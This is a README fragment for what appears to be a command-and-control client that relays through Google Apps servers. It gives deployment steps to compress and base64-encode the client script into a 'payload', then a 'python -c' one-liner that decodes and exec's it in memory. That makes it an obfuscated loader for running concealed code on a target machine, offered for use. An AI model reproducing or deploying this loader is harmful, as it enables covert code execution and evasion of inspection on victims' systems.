## Client Support

![Python](https://img.shields.io/static/v1?label=Python&message=2.7,%203%2B&color=success&logo=python&style=flat-square&logoColor=green) 
## Deployment Notes

- Since Python is an interpreted language, `client.py` is written to limit payload size.
- Add your Google Apps Server URLs to the `srv` array variable in `client.py`. The client will cycle through the array to load balance server connections.
- Run the following Python to generate a payload:

```python
# works with python2 or python3
import base64,zlib
f = open('client.py','rb')
print(base64.b64encode(zlib.compress(f.read(),9)).decode('utf-8'))
f.close()
```

- Copy the base64 encoded payload and paste it into the following command:

```bash
python -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('<PAYLOAD>')).decode('utf-8'))"
```

